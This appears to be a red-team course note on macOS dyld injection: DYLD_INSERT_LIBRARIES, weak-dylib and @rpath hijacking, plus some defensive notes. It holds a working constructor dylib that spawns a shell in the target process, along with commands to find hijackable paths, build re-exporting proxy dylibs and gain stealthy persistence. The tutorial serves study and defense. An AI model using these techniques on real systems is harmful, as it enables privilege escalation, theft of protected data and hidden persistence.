---
tags: [macos, privesc, injection, dyld, pentesting, red-team]
difficulty: advanced
module: "45 - macOS Privilege Escalation"
topic: "45.10 Dyld Hijacking and DYLD_INSERT_LIBRARIES"
---

# Dyld Hijacking and DYLD_INSERT_LIBRARIES

## Introduction
`dyld` is the macOS **dynamic linker** — the equivalent of Linux's `ld.so`. When a Mach-O binary launches, dyld resolves and loads the dynamic libraries (`.dylib`) it depends on. Two long-standing techniques abuse this to run attacker code inside a target process: **`DYLD_INSERT_LIBRARIES`** (force-load an extra dylib, like Linux `LD_PRELOAD`) and **dylib hijacking** (drop a malicious dylib where dyld will find it before the legitimate one). On macOS these are the bread-and-butter process-injection primitives — but their viability is gated by AMFI, library validation, and the hardened runtime (see [[07 - AMFI and Launch Constraints]]).

## DYLD_INSERT_LIBRARIES (the LD_PRELOAD analogue)
Setting this environment variable makes dyld load your dylib into the new process, running its constructor (`__attribute__((constructor))`) before `main`:

```c
// inject.c  -> compile: clang -dynamiclib inject.c -o inject.dylib
#include <stdio.h>
#include <stdlib.h>
__attribute__((constructor))
static void run(void) {
    system("id > /tmp/pwn; /bin/zsh");   // runs in target's context
}
```
```bash
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/target_binary
```

**Restrictions (why it often fails):**
- dyld **strips all `DYLD_*` variables** for SUID/SGID binaries and for any binary with the **hardened runtime** or **restricted/platform** flag.
- To survive into a hardened target, the target must hold `com.apple.security.cs.allow-dyld-environment-variables`, and to load your *unsigned* dylib it needs `com.apple.security.cs.disable-library-validation` (see [[09 - Dangerous Entitlements]]).
- Therefore the technique works against: non-hardened third-party apps, scripts/interpreters you launch, and specifically-entitled apps.

## Dylib Hijacking
Instead of an env var, you exploit *how dyld searches for a library*. Two sub-cases:

### 1. Missing weak dylib
A binary declares a dependency as **weak** (`LC_LOAD_WEAK_DYLIB`) at a path that **does not exist**. dyld silently continues if it's absent — but if you can *create* a dylib at that path, it gets loaded. Find them:
```bash
otool -l /path/App.app/Contents/MacOS/App | grep -A3 LC_LOAD_WEAK_DYLIB
# if the named path is writable & missing -> plant your dylib there
```

### 2. @rpath search-order abuse
A dylib loaded via `@rpath/foo.dylib` is searched across the binary's `LC_RPATH` entries **in order**. If an earlier rpath directory is **writable** and doesn't contain the real `foo.dylib`, your planted copy wins:
```bash
otool -l /path/bin | grep -A2 LC_RPATH        # list rpath dirs (search order)
otool -L /path/bin | grep @rpath              # @rpath-based deps
# plant malicious foo.dylib in the first writable rpath dir
```

```text
+---------------------------------------------------------------+
|                 DYLIB HIJACK DECISION TREE                    |
+---------------------------------------------------------------+
|  Target has hardened runtime + library validation?            |
|     YES -> need disable-library-validation entitlement,        |
|            else your unsigned dylib is rejected by AMFI        |
|     NO  -> proceed                                             |
|                                                               |
|  Weak dylib at a missing, writable path? -> plant it          |
|  @rpath dep with earlier WRITABLE rpath dir? -> plant it       |
|  Neither, but allow-dyld-env entitled? -> DYLD_INSERT_LIBS     |
+---------------------------------------------------------------+
```

A hijack dylib usually needs to **re-export** the real library's symbols so the host keeps working:
```bash
# build a proxy that forwards to the real dylib while running your code
clang -dynamiclib evil.c -o foo.dylib \
  -Wl,-reexport_library,/path/to/real/foo.dylib
install_name_tool -change @rpath/foo.dylib @loader_path/real_foo.dylib foo.dylib
```

## Why It's Powerful
Loading into a target process inherits **everything** that process has: its **TCC grants**, its **entitlements**, its **keychain access**, its sandbox/SIP context. Hijacking a dylib in an app with Full Disk Access yields FDA; hijacking one in an app with `private.tcc.allow` yields free data access — this is the standard way dangerous entitlements (see [[09 ...]]) are actually cashed in.

## Persistence Angle
A dylib hijack against an **auto-started** app (login item, LaunchAgent) is also stealthy persistence — your code runs every time the trusted, signed app launches, with no new binary on disk to flag (see [[13 - macOS Auto-Start Locations and Persistence]]).

## Defensive Notes
- Ship apps with the **hardened runtime + library validation**; this blocks unsigned-dylib injection outright.
- Avoid weak/missing dylib references and writable directories in `@rpath`; resolve dependencies to absolute, protected paths.
- Sign all bundled dylibs and verify with `codesign --verify --deep`.
- Monitor for new dylibs appearing in app bundles or rpath directories and for `DYLD_*` env on process launches.

## Related Notes
- [[06 - Code Signing and Entitlements]]
- [[07 - AMFI and Launch Constraints]]
- [[09 - Dangerous Entitlements]]
- [[12 - Electron Chromium and Interpreted App Injection]]
- [[13 - macOS Auto-Start Locations and Persistence]]
- [[06 - DLL Hijacking]]
